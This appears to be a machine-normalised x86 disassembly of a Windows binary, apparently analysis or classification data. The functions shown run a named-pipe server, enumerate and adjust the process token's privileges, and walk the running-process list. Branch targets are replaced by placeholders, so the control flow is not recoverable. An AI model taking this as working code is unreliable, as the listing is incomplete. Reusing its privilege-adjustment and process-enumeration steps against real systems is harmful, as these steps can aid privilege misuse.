cmp [ eax ] 0x0
je r-xdata
mov [ ebp - 0x4 ] 0x4
call j_sub_43d14a
mov edi [ ebp - 0x20 ]
test al al
jne r-xdata
mov eax [ ecx + 0xc ]
or eax edx
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
mov [ ebp - 0x14 ] 0x4
cmp edx edi
je r-xdata
mov edx [ esi ]
mov ecx [ edx + 0x4 ]
mov ecx [ ecx + esi + 0x38 ]
xor edi edi
push edi
push ebx
push eax
call sub_40a5c0
cmp eax ebx
jne r-xdata
cmp [ ebp - 0x18 ] 0x0
jbe r-xdata
mov eax [ ecx ]
push edx
mov edx [ eax + 0xc ]
call edx
movzx eax ax
mov eax [ ecx + 0x34 ]
cmp [ eax ] 0x0
jle r-xdata
mov [ ebp - 0x4 ] 0xffffffff
mov edx [ edi ]
mov eax [ edx + 0x4 ]
mov ecx [ eax + edi + 0x38 ]
test ecx ecx
je r-xdata
mov ecx edi
call sub_404650
push 0x0
push eax
call sub_402d50
or eax 0x4
mov eax [ esi ]
mov eax [ eax + 0x4 ]
xor ecx ecx
mov [ eax + esi + 0x20 ] ecx
mov [ eax + esi + 0x24 ] ecx
mov [ ebp - 0x4 ] 0x1
mov edx [ esi ]
mov eax [ edx + 0x4 ]
mov ecx [ eax + esi + 0x38 ]
movzx edx [ eax + esi + 0x40 ]
mov eax [ ecx + 0x24 ]
cmp [ eax ] 0x0
je r-xdata
dec [ ebp - 0x18 ]
jmp r-xdata
or [ ebp - 0x14 ] 0x4
dec [ eax ]
mov ecx [ ecx + 0x24 ]
mov eax [ ecx ]
lea edi [ eax + 0x2 ]
mov [ ecx ] edi
mov edi [ ebp + 0xc ]
mov [ eax ] dx
mov eax edx
jmp r-xdata
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ecx ]
mov eax [ edx + 0x8 ]
call eax
mov eax [ ecx ]
push edx
mov edx [ eax + 0xc ]
call edx
movzx eax ax
mov eax [ ecx + 0x34 ]
cmp [ eax ] 0x0
jle r-xdata
cmp [ ebp - 0x18 ] 0x0
jbe r-xdata
mov ecx 0xffff
cmp cx ax
jne r-xdata
dec [ ebp - 0x18 ]
jmp r-xdata
or [ ebp - 0x14 ] 0x4
jmp r-xdata
dec [ eax ]
mov ecx [ ecx + 0x24 ]
mov eax [ ecx ]
lea edi [ eax + 0x2 ]
mov [ ecx ] edi
mov [ eax ] dx
mov eax edx
jmp r-xdata
mov ecx 0xffff
cmp cx ax
jne r-xdata
sub_40a2fe
mov eax [ ebp + 0x8 ]
mov edx [ eax ]
mov ecx [ edx + 0x4 ]
add ecx eax
mov eax [ ecx + 0xc ]
or eax 0x4
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
push 0x1
push eax
call sub_402d50
mov [ ebp - 0x4 ] 0x1
mov eax r-xdata
retn
or eax 0x4
sub_40a340
push ebp
mov ebp esp
push 0xffffffff
push sub_451178
mov eax [ fs : 0x0 ]
push eax
sub esp 0x18
push ebx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
push 0x0
lea ecx [ ebp - 0x18 ]
call sub_436188
mov [ ebp - 0x4 ] 0x0
cmp [ rw-data ] 0x0
mov ebx [ rw-data ]
mov [ ebp - 0x10 ] ebx
jne r-xdata
mov esi [ rw-data ]
mov eax [ edi ]
cmp esi [ eax + 0xc ]
jae r-xdata
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_436188
cmp [ rw-data ] 0x0
jne r-xdata
xor ecx ecx
jmp r-xdata
mov ecx [ eax + 0x8 ]
mov ecx [ ecx + esi * 4 ]
test ecx ecx
jne r-xdata
lea ecx [ ebp - 0x14 ]
call sub_4361b0
mov eax [ rw-data ]
inc eax
mov [ rw-data ] eax
mov [ rw-data ] eax
cmp [ eax + 0x14 ] 0x0
je r-xdata
mov esi ecx
call sub_435e5e
cmp esi [ eax + 0xc ]
jae r-xdata
lea ecx [ ebp - 0x18 ]
mov [ ebp - 0x4 ] 0xffffffff
call sub_4361b0
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
test ebx ebx
je r-xdata
mov edx [ eax + 0x8 ]
mov esi [ edx + esi * 4 ]
jmp r-xdata
lea eax [ ebp - 0x10 ]
push edi
push eax
call sub_40a5e0
add esp 0x8
cmp eax 0xffffffff
jne r-xdata
mov esi ebx
jmp r-xdata
test esi esi
jne r-xdata
mov esi [ ebp - 0x10 ]
push 0x0
lea ecx [ ebp - 0x14 ]
mov [ rw-data ] esi
call sub_436188
mov eax [ esi + 0x4 ]
cmp eax 0xffffffff
jae r-xdata
push r--data
lea ecx [ ebp - 0x24 ]
call sub_437d0f
push r--data
lea ecx [ ebp - 0x24 ]
push ecx
call sub_43c3a5
lea ecx [ ebp - 0x14 ]
call sub_4361b0
push esi
call sub_435de7
add esp 0x4
inc eax
mov [ esi + 0x4 ] eax
sub_40a480
push ebp
mov ebp esp
push 0xffffffff
push sub_451178
mov eax [ fs : 0x0 ]
push eax
sub esp 0x18
push ebx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
push 0x0
lea ecx [ ebp - 0x18 ]
call sub_436188
mov [ ebp - 0x4 ] 0x0
cmp [ rw-data ] 0x0
mov ebx [ rw-data ]
mov [ ebp - 0x10 ] ebx
jne r-xdata
mov esi [ rw-data ]
mov eax [ edi ]
cmp esi [ eax + 0xc ]
jae r-xdata
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_436188
cmp [ rw-data ] 0x0
jne r-xdata
xor ecx ecx
jmp r-xdata
mov ecx [ eax + 0x8 ]
mov ecx [ ecx + esi * 4 ]
test ecx ecx
jne r-xdata
lea ecx [ ebp - 0x14 ]
call sub_4361b0
mov eax [ rw-data ]
inc eax
mov [ rw-data ] eax
mov [ rw-data ] eax
cmp [ eax + 0x14 ] 0x0
je r-xdata
mov esi ecx
call sub_435e5e
cmp esi [ eax + 0xc ]
jae r-xdata
lea ecx [ ebp - 0x18 ]
mov [ ebp - 0x4 ] 0xffffffff
call sub_4361b0
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
test ebx ebx
je r-xdata
mov edx [ eax + 0x8 ]
mov esi [ edx + esi * 4 ]
jmp r-xdata
lea eax [ ebp - 0x10 ]
push edi
push eax
call sub_40a6a0
add esp 0x8
cmp eax 0xffffffff
jne r-xdata
mov esi ebx
jmp r-xdata
test esi esi
jne r-xdata
mov esi [ ebp - 0x10 ]
push 0x0
lea ecx [ ebp - 0x14 ]
mov [ rw-data ] esi
call sub_436188
mov eax [ esi + 0x4 ]
cmp eax 0xffffffff
jae r-xdata
push r--data
lea ecx [ ebp - 0x24 ]
call sub_437d0f
push r--data
lea ecx [ ebp - 0x24 ]
push ecx
call sub_43c3a5
lea ecx [ ebp - 0x14 ]
call sub_4361b0
push esi
call sub_435de7
add esp 0x4
inc eax
mov [ esi + 0x4 ] eax
sub_40a5c0
push ebp
mov ebp esp
and esp 0xfffffff8
mov edx [ ebp + 0x10 ]
mov eax [ ecx ]
mov eax [ eax + 0x24 ]
push edx
mov edx [ ebp + 0xc ]
push edx
mov edx [ ebp + 0x8 ]
push edx
call eax
mov esp ebp
pop ebp
retn 0xc
sub_40a5e0
push ebp
mov ebp esp
push 0xffffffff
push sub_45130b
mov eax [ fs : 0x0 ]
push eax
sub esp 0x28
push ebx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
xor ebx ebx
mov [ ebp - 0x10 ] ebx
test eax eax
je r-xdata
mov eax 0x4
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ eax ] ebx
jne r-xdata
push 0x10
call sub_438178
mov esi eax
add esp 0x4
mov [ ebp - 0x10 ] esi
mov [ ebp - 0x4 ] ebx
test esi esi
je r-xdata
xor esi esi
mov eax [ ebp + 0xc ]
mov eax [ eax ]
mov ecx [ eax + 0x18 ]
test ecx ecx
je r-xdata
lea ecx [ ebp - 0x34 ]
call sub_4026b0
add eax 0x1c
mov eax ecx
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov [ ebp - 0x4 ] 0xffffffff
mov [ ecx ] esi
test bl 0x1
je r-xdata
push eax
lea ecx [ ebp - 0x34 ]
call sub_402600
mov ebx 0x1
mov [ esi + 0x4 ] 0x0
mov [ esi ] r--data
call sub_435bc6
mov [ esi + 0x8 ] eax
mov [ esi + 0xc ] edx
jmp r-xdata
sub_40a6a0
push ebp
mov ebp esp
push 0xffffffff
push sub_45114c
mov eax [ fs : 0x0 ]
push eax
sub esp 0x30
push ebx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
xor ebx ebx
mov [ ebp - 0x10 ] ebx
test eax eax
je r-xdata
mov eax 0x4
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ eax ] ebx
jne r-xdata
push 0x18
call sub_438178
mov esi eax
add esp 0x4
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x4 ] ebx
test esi esi
je r-xdata
xor esi esi
mov eax [ ebp + 0xc ]
mov eax [ eax ]
mov ecx [ eax + 0x18 ]
test ecx ecx
jne r-xdata
lea ecx [ ebp - 0x38 ]
call sub_4026b0
push ecx
lea ecx [ ebp - 0x38 ]
call sub_402600
mov ebx 0x1
mov [ ebp - 0x10 ] ebx
mov [ esi + 0x4 ] 0x0
mov [ ebp - 0x4 ] 0x2
push esi
mov [ esi ] r--data
call sub_40a760
jmp r-xdata
lea ecx [ eax + 0x1c ]
mov ecx [ ebp + 0x8 ]
mov [ ecx ] esi
mov [ ebp - 0x4 ] 0xffffffff
test bl 0x1
je r-xdata
sub_40a760
push ebp
mov ebp esp
push 0xffffffff
push sub_4510b0
mov eax [ fs : 0x0 ]
push eax
sub esp 0x28
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov esi [ ebp + 0x8 ]
call sub_438c6d
xor ebx ebx
mov [ ebp - 0x20 ] eax
mov [ esi + 0x8 ] ebx
mov [ esi + 0x10 ] ebx
mov [ esi + 0x14 ] ebx
mov [ ebp - 0x4 ] ebx
mov edi r--data
call sub_435bc6
push 0x1
mov [ ebp - 0x18 ] 0x1
call sub_435b34
add esp 0x4
mov ecx eax
mov [ esi + 0x8 ] eax
call sub_435bc6
mov [ ebp - 0x1c ] eax
lea eax [ ebp - 0x1c ]
push eax
push r--data
mov [ ebp - 0x18 ] edx
call sub_407370
add esp 0x8
mov [ esi + 0x10 ] eax
call sub_435bc6
lea ecx [ ebp - 0x1c ]
push ecx
push r--data
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x18 ] edx
call sub_407370
add esp 0x8
mov [ esi + 0x14 ] eax
call sub_435bc6
mov edi [ ebp - 0x20 ]
mov [ ebp - 0x24 ] edx
mov edx [ edi ]
mov [ ebp - 0x28 ] eax
mov al [ edx ]
lea ecx [ ebp - 0x28 ]
push ecx
lea edx [ ebp - 0x20 ]
push edx
mov [ ebp + 0x8 ] al
push 0x1
lea eax [ ebp + 0x8 ]
push eax
lea ecx [ ebp - 0x18 ]
push ecx
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x20 ] ebx
call sub_43640d
mov dx [ ebp - 0x18 ]
add esp 0x14
mov [ esi + 0xc ] dx
call sub_435bc6
mov [ ebp - 0x28 ] eax
mov eax [ edi + 0x4 ]
mov [ ebp - 0x24 ] edx
mov cl [ eax ]
lea edx [ ebp - 0x28 ]
push edx
lea eax [ ebp - 0x20 ]
push eax
mov [ ebp + 0x8 ] cl
push 0x1
lea ecx [ ebp + 0x8 ]
push ecx
lea edx [ ebp - 0x18 ]
push edx
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x20 ] ebx
call sub_43640d
mov ax [ ebp - 0x18 ]
mov [ esi + 0xe ] ax
mov al 0x1
add esp 0x14
cmp al bl
je r-xdata
mov dl [ edi ]
dec [ ebp - 0x18 ]
mov [ ecx ] dl
inc ecx
inc edi
jmp r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
call sub_435bc6
lea ecx [ ebp - 0x28 ]
push ecx
mov [ ebp - 0x24 ] edx
lea edx [ ebp - 0x20 ]
push edx
mov [ ebp - 0x28 ] eax
push 0x1
lea eax [ ebp + 0x8 ]
push eax
lea ecx [ ebp - 0x18 ]
push ecx
mov [ ebp + 0x8 ] 0x2e
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x20 ] ebx
call sub_43640d
mov dx [ ebp - 0x18 ]
add esp 0x14
mov [ esi + 0xc ] dx
call sub_435bc6
mov [ ebp - 0x30 ] eax
lea eax [ ebp - 0x30 ]
push eax
lea ecx [ ebp - 0x24 ]
push ecx
mov [ ebp - 0x2c ] edx
push 0x1
lea edx [ ebp + 0x8 ]
push edx
lea eax [ ebp - 0x20 ]
push eax
mov [ ebp + 0x8 ] 0x2c
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x24 ] ebx
call sub_43640d
mov cx [ ebp - 0x20 ]
add esp 0x14
mov [ esi + 0xe ] cx
cmp [ ebp - 0x18 ] ebx
jbe r-xdata
sub_40a930
push ebp
mov ebp esp
push 0xffffffff
push sub_45220b
mov eax [ fs : 0x0 ]
push eax
push ecx
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esi
mov [ ebp - 0x4 ] 0x1
lea edi [ esi + 0x8 ]
mov [ esi ] r--data
mov [ esi + 0x4 ] 0xffffffff
xor eax eax
mov [ edi + 0x14 ] 0x7
mov [ edi + 0x10 ] 0x0
mov [ edi ] ax
push 0x2
mov eax r--data
mov ecx edi
call sub_401c90
push 0x0
lea ecx [ ebp + 0x24 ]
push ecx
or eax 0xffffffff
mov [ ebp - 0x4 ] 0x2
call sub_406d90
push 0x6
mov eax r--data
mov ecx edi
call sub_40ac40
push 0x0
lea edx [ ebp + 0x8 ]
push edx
or eax 0xffffffff
call sub_406d90
mov edi 0x8
cmp [ ebp + 0x1c ] edi
jb r-xdata
xor ecx ecx
mov [ ebp + 0x1c ] 0x7
mov [ ebp + 0x18 ] 0x0
mov [ ebp + 0x8 ] cx
cmp [ ebp + 0x38 ] edi
jb r-xdata
mov eax [ ebp + 0x8 ]
push eax
call sub_43811c
add esp 0x4
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
mov esp ebp
pop ebp
retn 0x38
mov edx [ ebp + 0x24 ]
push edx
call sub_43811c
add esp 0x4
sub_40aa10
push ebp
mov ebp esp
push esi
mov esi ecx
mov eax [ esi + 0x4 ]
mov [ esi ] r--data
cmp eax 0xffffffff
je r-xdata
cmp [ esi + 0x1c ] 0x8
jb r-xdata
test eax eax
je r-xdata
xor eax eax
test [ ebp + 0x8 ] 0x1
mov [ esi + 0x1c ] 0x7
mov [ esi + 0x18 ] 0x0
mov [ esi + 0x8 ] ax
je r-xdata
mov edx [ esi + 0x8 ]
push edx
call sub_43811c
add esp 0x4
push eax
call [ FlushFileBuffers@IAT ]
mov eax [ esi + 0x4 ]
push eax
call [ DisconnectNamedPipe@IAT ]
mov ecx [ esi + 0x4 ]
push ecx
call [ CloseHandle@IAT ]
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_43811c
add esp 0x4
sub_40aa80
push ebp
mov ebp esp
sub esp 0x10c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
cmp [ esi + 0x14 ] 0x8
mov eax [ rw-data ]
mov [ ebp - 0x10c ] eax
mov [ esi + 0x10 ] 0x0
jb r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
mov eax [ ebp - 0x108 ]
shr eax 0x1
push eax
lea eax [ ebp - 0x104 ]
mov ecx esi
call sub_40ac40
test bl bl
je r-xdata
call [ GetLastError@IAT ]
cmp eax 0xea
jne r-xdata
push ebx
xor ecx ecx
push edi
mov edi [ ReadFile@IAT ]
mov [ eax ] cx
mov edi edi
mov ecx [ ebp - 0x10c ]
push 0x0
lea edx [ ebp - 0x108 ]
push edx
mov edx [ ecx + 0x4 ]
push 0x100
lea eax [ ebp - 0x104 ]
push eax
push edx
call edi
test eax eax
setne bl
test bl bl
jne r-xdata
pop edi
mov al 0x1
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_437c1c
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
xor al al
pop ebx
call sub_437c1c
mov esp ebp
pop ebp
retn
sub_40ab40
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi [ eax + 0x10 ]
xor bl bl
add esi esi
cmp [ eax + 0x14 ] 0x8
push edi
mov edi [ rw-data ]
jb r-xdata
mov edx [ edi + 0x4 ]
push 0x0
lea ecx [ ebp - 0x4 ]
push ecx
push esi
push eax
push edx
call [ WriteFile@IAT ]
test eax eax
je r-xdata
mov eax [ eax ]
pop edi
pop esi
mov al bl
pop ebx
mov esp ebp
pop ebp
retn
cmp esi [ ebp - 0x4 ]
jne r-xdata
mov eax [ edi + 0x4 ]
push eax
call [ FlushFileBuffers@IAT ]
pop edi
test eax eax
pop esi
setne al
pop ebx
mov esp ebp
pop ebp
retn
sub_40aba0
push ebx
push esi
mov esi [ rw-data ]
mov eax [ esi + 0x4 ]
xor bl bl
test eax eax
je r-xdata
cmp [ esi + 0x1c ] 0x8
lea eax [ esi + 0x8 ]
jb r-xdata
cmp eax 0xffffffff
jne r-xdata
push 0x0
push 0x7530
push 0x0
push 0x0
push 0x1
push 0x6
push 0x3
push eax
call [ CreateNamedPipeW@IAT ]
mov [ esi + 0x4 ] eax
test eax eax
je r-xdata
mov eax [ eax ]
pop esi
mov al bl
pop ebx
retn
cmp eax 0xffffffff
je r-xdata
cmp eax 0xffffffff
je r-xdata
test eax eax
je r-xdata
push 0x0
push eax
call [ ConnectNamedPipe@IAT ]
test eax eax
je r-xdata
push eax
call [ FlushFileBuffers@IAT ]
mov eax [ esi + 0x4 ]
push eax
call [ DisconnectNamedPipe@IAT ]
mov ecx [ esi + 0x4 ]
push ecx
call [ CloseHandle@IAT ]
call [ GetLastError@IAT ]
cmp eax 0x217
pop esi
sete al
pop ebx
retn
pop esi
mov al 0x1
pop ebx
retn
sub_40ac40
push ebp
mov ebp esp
push ebx
mov ebx eax
push edi
mov edi ecx
test ebx ebx
je r-xdata
mov eax [ edi + 0x10 ]
mov ecx [ ebp + 0x8 ]
or edx 0xffffffff
sub edx eax
cmp edx ecx
ja r-xdata
mov ecx [ edi + 0x14 ]
cmp ecx 0x8
jb r-xdata
test ecx ecx
je r-xdata
push r--data
call sub_435a79
mov eax edi
mov eax [ edi ]
jmp r-xdata
mov eax edi
pop edi
pop ebx
pop ebp
retn 0x4
push esi
lea esi [ eax + ecx ]
mov eax edi
call sub_401ef0
test al al
je r-xdata
cmp ecx 0x8
jb r-xdata
cmp ebx eax
jb r-xdata
pop esi
cmp [ edi + 0x14 ] 0x8
jb r-xdata
mov eax edi
mov eax [ edi ]
jmp r-xdata
mov eax edi
mov eax [ edi ]
jmp r-xdata
cmp ecx 0x8
jb r-xdata
mov edx [ edi + 0x10 ]
lea eax [ eax + edx * 2 ]
cmp eax ebx
jbe r-xdata
mov eax edi
xor ecx ecx
mov [ eax + esi * 2 ] cx
mov eax [ edi ]
xor ecx ecx
mov [ eax + esi * 2 ] cx
pop esi
mov eax edi
pop edi
pop ebx
pop ebp
retn 0x4
mov ecx [ ebp + 0x8 ]
lea edx [ ecx + ecx ]
mov ecx [ edi + 0x10 ]
push edx
lea edx [ eax + ecx * 2 ]
push ebx
push edx
call sub_43a8a0
add esp 0xc
cmp [ edi + 0x14 ] 0x8
mov [ edi + 0x10 ] esi
jb r-xdata
mov eax edi
sub ebx eax
mov eax [ ebp + 0x8 ]
sar ebx 0x1
push ebx
push edi
call sub_406d90
pop edi
pop ebx
pop ebp
retn 0x4
mov eax [ edi ]
sub ebx eax
mov eax [ ebp + 0x8 ]
sar ebx 0x1
push ebx
push edi
call sub_406d90
pop edi
pop ebx
pop ebp
retn 0x4
sub_40ad20
push ebp
mov ebp esp
push ecx
push ebx
mov ebx [ LookupPrivilegeNameW@IAT ]
lea eax [ ebp - 0x4 ]
push eax
push 0x0
push edi
push 0x0
mov [ ebp - 0x4 ] 0x0
call ebx
test eax eax
jne r-xdata
xor al al
pop ebx
mov esp ebp
pop ebp
retn
call [ GetLastError@IAT ]
cmp eax 0x7a
jne r-xdata
mov eax [ ebp - 0x4 ]
xor ecx ecx
mov edx 0x2
mul edx
seto cl
push esi
neg ecx
or ecx eax
push ecx
call sub_435b34
add esp 0x4
mov esi eax
lea eax [ ebp - 0x4 ]
push eax
push esi
push edi
push 0x0
call ebx
test eax eax
setne bl
test bl bl
je r-xdata
push esi
call sub_438111
add esp 0x4
pop esi
mov al bl
pop ebx
mov esp ebp
pop ebp
retn
mov eax esi
lea edx [ eax + 0x2 ]
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
mov ecx [ ebp + 0x8 ]
sub eax edx
sar eax 0x1
push eax
mov eax esi
call sub_401c90
sub_40adc0
push ebp
mov ebp esp
push 0xffffffff
push sub_452aa8
mov eax [ fs : 0x0 ]
push eax
sub esp 0x48
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x14 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x50 ] eax
xor ebx ebx
mov [ ebp - 0x44 ] 0xffffffff
call [ GetCurrentProcess@IAT ]
lea ecx [ ebp - 0x44 ]
push ecx
push 0x8
push eax
call [ OpenProcessToken@IAT ]
test eax eax
je r-xdata
mov al bl
mov eax [ ebp - 0x44 ]
mov esi [ GetTokenInformation@IAT ]
lea edx [ ebp - 0x3c ]
push edx
push ebx
push ebx
push 0x3
push eax
mov [ ebp - 0x3c ] ebx
call esi
test eax eax
jne r-xdata
call [ GetLastError@IAT ]
cmp eax 0x7a
jne r-xdata
mov ecx [ ebp - 0x3c ]
push ecx
call sub_435b34
mov ecx [ ebp - 0x44 ]
add esp 0x4
mov edi eax
mov eax [ ebp - 0x3c ]
lea edx [ ebp - 0x3c ]
push edx
push eax
push edi
push 0x3
push ecx
mov [ ebp - 0x4c ] edi
call esi
test eax eax
setne al
mov [ ebp - 0x35 ] al
cmp al bl
je r-xdata
push edi
call sub_438111
mov al [ ebp - 0x35 ]
add esp 0x4
jmp r-xdata
mov [ ebp - 0x48 ] ebx
cmp [ edi ] ebx
jbe r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x14 ]
xor ecx ebp
call sub_437c1c
mov esp ebp
pop ebp
retn
add edi 0xc
mov [ ebp - 0x40 ] edi
xor esi esi
xor edx edx
mov [ eax + 0x14 ] 0x7
mov [ eax + 0x10 ] ebx
mov [ eax ] dx
mov esi eax
jmp r-xdata
cmp esi ebx
je r-xdata
mov eax [ ebp - 0x40 ]
push eax
mov edx esi
lea eax [ ebp - 0x34 ]
call sub_40b090
add esp 0x4
mov [ ebp - 0x4 ] ebx
mov ebx [ ebp - 0x50 ]
mov ecx eax
call sub_401a00
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x20 ] 0x8
jb r-xdata
mov edi [ ebp - 0x40 ]
push esi
add edi 0xfffffff8
call sub_40ad20
add esp 0x4
test al al
je r-xdata
mov eax [ ebp - 0x48 ]
mov edx [ ebp - 0x4c ]
add [ ebp - 0x40 ] 0xc
inc eax
mov [ ebp - 0x48 ] eax
cmp eax [ edx ]
jb r-xdata
cmp [ esi + 0x14 ] 0x8
jb r-xdata
xor edx edx
mov [ ebp - 0x20 ] 0x7
mov [ ebp - 0x24 ] 0x0
mov [ ebp - 0x34 ] dx
xor ebx ebx
mov ecx [ ebp - 0x34 ]
push ecx
call sub_43811c
add esp 0x4
push 0x1c
call sub_438178
add esp 0x4
cmp eax ebx
je r-xdata
mov edi edx
xor ecx ecx
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] ebx
push esi
mov [ esi ] cx
call sub_43811c
add esp 0x4
mov eax [ esi ]
push eax
call sub_43811c
add esp 0x4
sub_40af80
push ebp
mov ebp esp
sub esp 0xc
mov eax [ edi + 0x4 ]
sub eax [ edi ]
push ebx
sar eax 0x5
lea eax [ eax + eax * 2 ]
lea ecx [ eax * 4 + 0x4 ]
push esi
push ecx
xor bl bl
call sub_435b34
mov edx [ edi + 0x4 ]
sub edx [ edi ]
add esp 0x4
sar edx 0x5
mov [ eax ] edx
mov esi [ edi ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x4 ] 0x0
cmp esi [ edi + 0x4 ]
je r-xdata
mov edx [ ebp - 0xc ]
push edx
call sub_43811c
add esp 0x4
pop esi
mov al bl
pop ebx
mov esp ebp
pop ebp
retn
add eax 0xc
mov [ ebp - 0x8 ] eax
lea ebx [ ebx ]
test bl bl
je r-xdata
cmp [ esi + 0x14 ] 0x8
jb r-xdata
mov [ ebp - 0x8 ] 0xffffffff
call [ GetCurrentProcess@IAT ]
lea edx [ ebp - 0x8 ]
push edx
push 0x20
push eax
call [ OpenProcessToken@IAT ]
test eax eax
setne bl
test bl bl
je r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
mov eax [ ebp - 0xc ]
mov ecx [ ebp - 0x8 ]
push 0x0
push 0x0
push 0x0
push eax
push 0x0
push ecx
call [ AdjustTokenPrivileges@IAT ]
test eax eax
je r-xdata
mov eax [ ebp - 0x8 ]
mov ecx [ esi + 0x1c ]
inc [ ebp - 0x4 ]
mov [ eax ] ecx
add esi 0x20
add eax 0xc
mov [ ebp - 0x8 ] eax
cmp esi [ edi + 0x4 ]
jne r-xdata
mov edx [ ebp - 0x8 ]
add edx 0xfffffff8
push edx
push eax
push 0x0
call [ LookupPrivilegeValueW@IAT ]
test eax eax
setne bl
test bl bl
je r-xdata
xor bl bl
call [ GetLastError@IAT ]
test eax eax
jne r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ ebp - 0xc ]
cmp eax [ ecx ]
jae r-xdata
mov edx [ ebp - 0xc ]
push edx
mov bl 0x1
call sub_43811c
add esp 0x4
pop esi
mov al bl
pop ebx
mov esp ebp
pop ebp
retn
sub_40b090
push ebp
mov ebp esp
push ecx
push edi
mov edi eax
xor eax eax
push eax
mov [ edi + 0x10 ] eax
mov [ ebp - 0x4 ] eax
xor ecx ecx
mov [ edi + 0x14 ] 0x7
push edx
or eax 0xffffffff
mov [ edi ] cx
call sub_401be0
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov [ edi + 0x1c ] ecx
mov eax edi
pop edi
mov esp ebp
pop ebp
retn
sub_40b0d0
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_4521bb
mov eax [ fs : 0x0 ]
push eax
sub esp 0x284
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x27c ] eax
push ebx
push esi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x290 ]
mov [ fs : 0x0 ] eax
push 0x0
mov esi ecx
push 0x2
mov [ esp + 0x14 ] esi
call [ CreateToolhelp32Snapshot@IAT ]
mov ebx eax
mov [ esp + 0x10 ] ebx
cmp ebx 0xffffffff
je r-xdata
xor al al
lea eax [ esp + 0x54 ]
push eax
push ebx
mov [ esp + 0x5c ] 0x22c
call [ Process32FirstW@IAT ]
test eax eax
je r-xdata
push ebx
call [ CloseHandle@IAT ]
mov al 0x1
jmp r-xdata
lea ebx [ ebx ]
mov ecx [ esp + 0x290 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
pop ebx
mov ecx [ esp + 0x27c ]
xor ecx esp
call sub_437c1c
mov esp ebp
pop ebp
retn
mov edx [ esp + 0x54 ]
mov eax [ esp + 0x58 ]
mov ecx [ esp + 0x5c ]
mov [ esp + 0x14 ] edx
mov edx [ esp + 0x60 ]
mov [ esp + 0x18 ] eax
mov eax [ esp + 0x64 ]
mov [ esp + 0x20 ] edx
mov edx [ esp + 0x6c ]
mov [ esp + 0x1c ] ecx
mov ecx [ esp + 0x68 ]
mov [ esp + 0x24 ] eax
mov eax [ esp + 0x70 ]
mov [ esp + 0x2c ] edx
xor edx edx
mov [ esp + 0x28 ] ecx
mov ecx [ esp + 0x74 ]
mov [ esp + 0x30 ] eax
lea eax [ esp + 0x78 ]
mov [ esp + 0x38 ] dx
mov [ esp + 0x34 ] ecx
mov [ esp + 0x4c ] 0x7
mov [ esp + 0x48 ] 0x0
lea edx [ eax + 0x2 ]
lea ecx [ esp + 0x78 ]
push ecx
mov eax esi
call sub_4019f0
push eax
call sub_438e70
add esp 0x8
test eax eax
jne r-xdata
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax edx
